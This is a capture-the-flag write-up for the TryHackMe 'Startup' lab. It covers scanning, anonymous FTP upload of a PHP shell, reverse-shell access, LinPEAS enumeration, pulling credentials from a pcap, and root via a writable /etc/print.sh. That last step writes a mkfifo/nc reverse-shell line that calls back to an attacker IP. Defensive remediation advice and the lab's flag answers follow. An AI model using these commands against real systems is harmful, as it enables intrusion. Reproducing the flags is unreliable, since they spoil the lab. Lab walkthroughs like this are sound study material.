# TryHackMe: Startup — Write-up

> **Lab:** TryHackMe — Startup
> **Link**: https://tryhackme.com/room/agentt
> **Local host:** `192.168.133.108`  
> **Target:** `10.49.190.233`
> **Scope:** Reconnaissance, FTP and web enumeration, file-upload exploitation, shell access, Linux enumeration, packet analysis, and privilege escalation.

## Table of Content
```table-of-contents
```

---

## 1. Port scanning and service enumeration

### 1.1 Port Scanning
Start by scanning the target for open ports with RustScan. Save the discovered ports to `ports.txt` so they can be passed to Nmap.

```bash
rustscan -a 10.49.157.11 -b 1000 --timeout 1500 -g \
  | awk -F'->' '{print $2}' \
  | tr -d '[]' > ports.txt
```

![Pasted image 20261018114042](Image/Tryhackme%20-%20Startup/Pasted%20image%2020261018114042.png)

### 1.2 Enumerate opened port

```bash
sudo nmap -sV -sC -O -p "$(cat ports.txt)" -T4 10.49.157.11 -oX service.xml
```

![Pasted image 20261018114544](Image/Tryhackme%20-%20Startup/Pasted%20image%2020261018114544.png)
### 1.3 Search for known vulnerabilities

Use SearchSploit to search for known exploits related to the services identified by Nmap.

```bash
searchsploit --nmap service.xml
```

![Pasted image 20261018113449](Image/Tryhackme%20-%20Startup/Pasted%20image%2020261018113449.png)
### 1.4 FTP enumeration

Since nmap show ftp open and allow anonymous login:

```bash
ftp 10.49.190.233         # Username: anonymous

ls -la
get .test.log
get important.jpg
get notice.txt
cd ftp
```

![Pasted image 20261018113400](Image/Tryhackme%20-%20Startup/Pasted%20image%2020261018113400.png)
### 1.5 Web directory enumeration

Use Gobuster to discover web directories and files.

```bash
gobuster dir -u http://10.49.190.233/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
```

Scan result:

```bash
files                (Status: 301) [Size: 314] [--> http://<target-ip>/files/]
index.html           (Status: 200) [Size: 808]
```

Inspect `/files/` and any accessible subdirectories, including `/files/ftp/`. Check whether files placed in the FTP directory are also accessible through the web server.

## 2. Vulnerability Analysis & Exploitation

### 2.1 File upload testing

The lab notes indicate that files uploaded through FTP became accessible through the web server. This suggests a potential path from file upload to code execution if the server interprets uploaded script files.

Check this by upload a harmless text file first.

![Pasted image 20261018121937](Image/Tryhackme%20-%20Startup/Pasted%20image%2020261018121937.png)

![Pasted image 20261018121957](Image/Tryhackme%20-%20Startup/Pasted%20image%2020261018121957.png)

### 2.2 Uploading the PHP file through FTP

Confirm whether the target also allow PHP file upload.

```bash
ftp 10.49.190.233      # Username: anonymous
ls
cd ftp
put cmd.php
bye
```

![Pasted image 20261018122806](Image/Tryhackme%20-%20Startup/Pasted%20image%2020261018122806.png)

![Pasted image 20261018122750](Image/Tryhackme%20-%20Startup/Pasted%20image%2020261018122750.png)

![Pasted image 20261018122847](Image/Tryhackme%20-%20Startup/Pasted%20image%2020261018122847.png)

![Pasted image 20261018123053](Image/Tryhackme%20-%20Startup/Pasted%20image%2020261018123053.png)

It does.
### 2.3 Reverse shell

Set up listening on open terminal.

```bash
nc -lvnp 4444
```

Using Revshells.com to generate a reverse shell script: Python #1

![Pasted image 20261018124818](Image/Tryhackme%20-%20Startup/Pasted%20image%2020261018124818.png)
### 2.4. Upgrade shell

Upgrade it to a more usable interactive Bash session.

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

 `Ctrl+Z`

```bash
stty raw -echo && fg
```
### 2.5 Linux enumeration with LinPEAS

Rather than manually checking every directory and configuration, use LinPEAS to help identify potential privilege-escalation paths.

**On the local machine:**
Download LinPEAS and start a temporary HTTP server from the directory containing the script.

```bash
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
python3 -m http.server 9000
```

![Pasted image 20261018133919](Image/Tryhackme%20-%20Startup/Pasted%20image%2020261018133919.png)

**On the target machine:**
Download the script to `/tmp`, make it executable, and run it while saving the output.

```bash
cd /tmp
wget http://192.168.133.108:9000/linpeas.sh
chmod +x ./linpeas.sh
./linpeas.sh -r | tee linpeas.txt
```

**We found a lot of thing including one of the answer to the lab question and a suspicious.pcapng file.**

![Pasted image 20261018134026](Image/Tryhackme%20-%20Startup/Pasted%20image%2020261018134026.png)
![Pasted image 20261018134538](Image/Tryhackme%20-%20Startup/Pasted%20image%2020261018134538.png)
![Screenshot 2026-10-18 135446](Image/Tryhackme%20-%20Startup/Screenshot%202026-10-18%20135446.png)
### 2.6 Retrieve and analyze the packet capture

There are multiple ways to retrieve the file, but here are the simplest 2 options to choose from in case one of them isn't work for you.
#### Option A: Copy it to a web-accessible directory

```bash
cp /incidents/suspicious.pcapng /var/www/html/files/ftp/
```

Then download it using ftp connection as we did in [[##3. FTP enumeration|FTP Enumeration]]
#### Option B: Serve it directly over HTTP

On the target:

```bash
cd /incidents
python3 -m http.server 8000
```

On the local machine:

```bash
wget http://10.49.190.233:8000/suspicious.pcapng
```

Open the PCAP file in Wireshark:

```bash
wireshark suspicious.pcapng
```

![Pasted image 20261018134824](Image/Tryhackme%20-%20Startup/Pasted%20image%2020261018134824.png)
#### Analysis the PCAP file

Start by filtering for the first TCP stream:

```bash
tcp.stream eq 0
```

![Pasted image 20261018160809](Image/Tryhackme%20-%20Agent%20T/Pasted%20image%2020261018160809.png)

Select the first options > right click > Follow > TCP steams or simply use shortcut: Ctrl + Alt + Shift + T

![Pasted image 20261018135231](Image/Tryhackme%20-%20Startup/Pasted%20image%2020261018135231.png)

Increase Stream (bottom right) until you find the stream we want (7)

![Screenshot 2026-10-18 135254](Image/Tryhackme%20-%20Startup/Screenshot%202026-10-18%20135254.png)

Now, we get a username and password we can try login as this user.

![Pasted image 20261018140436](Image/Tryhackme%20-%20Startup/Pasted%20image%2020261018140436.png)
## 2.7 Privilege Escalation

Looking around this user directory we can find our second answer to the lab in user.txt, and more importantly the planner.sh in scripts directory.

![Pasted image 20261018144251](Image/Tryhackme%20-%20Startup/Pasted%20image%2020261018144251.png)

Unfortunately, this shell script file doesn't have write permission. Instead we found another shell script file in /etc/. Thankfully, this file is writable which is just what we need.

Now, we can tried "nc mkfifo" from revshells.com which work like magic:

```bash
echo '#!/bin/bash' > /etc/print.sh
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.133.108 5555 >/tmp/f' >> /etc/print.sh
```

![Pasted image 20261018152311](Image/Tryhackme%20-%20Startup/Pasted%20image%2020261018152311.png)
## 3. Defensive Remediation & Mitigations

> **Info**
> To secure the asset against the specific attack vectors exploited during this assessment, the following remediation steps are recommended:
> 
> - Enforce Strict File Validation: Implement a server-side file type allowlist that accepts only explicitly approved formats (e.g., `.png`, `.jpg`). Validate file extensions, MIME types, and file signatures, as no single check is sufficient on its own.
> - Disable Script Execution in Upload Directories: Configure the web server to prevent execution of PHP and other server-side scripts within directories used for uploaded files, including `/files/ftp/`. Store uploads outside the web root where possible and serve them through a controlled download handler.
> - Restrict Anonymous FTP Access: Disable anonymous FTP access unless explicitly required. If FTP is necessary, enforce authentication, restrict users to designated directories, and apply least-privilege filesystem permissions to prevent unauthorized file uploads or access to sensitive files.
> - Apply Least-Privilege File Permissions: Ensure that the FTP service account and web server process cannot modify application code, system scripts, or sensitive configuration files. Separate upload permissions from web application execution permissions.
> - Update Reverse-Shell Exposure and Outbound Traffic: Apply host-based and network firewalls to restrict unnecessary inbound and outbound connections. Monitor unusual outbound connections and unauthorized listeners that could indicate a compromised host.
> - Implement Centralized Logging and Monitoring: Enable and retain FTP authentication logs, web server access and error logs, system authentication logs, and process execution events. Alert on suspicious file uploads, unexpected PHP execution, unusual outbound connections, and unauthorized changes to system files.
> - Protect Sensitive Files and Incident Data: Restrict access to directories such as `/incidents/` and prevent sensitive packet captures, logs, and investigation artifacts from being exposed through the web server. Store incident evidence outside publicly accessible directories and enforce appropriate ownership and access controls.
## 4. Challenge Answer

<details>
<summary>Spoiler Warning!</summary>


| Question                              | Answer                                |
| ------------------------------------- | ------------------------------------- |
| What is the secret spicy soup recipe? | love                                  |
| What are the contents of user.txt?    | THM{03ce3d619b80ccbfb3b7fc81e46c0e79} |
| What are the contents of root.txt?    | THM{f963aaa6a430f210222158ae15c3d76d} |

</details>
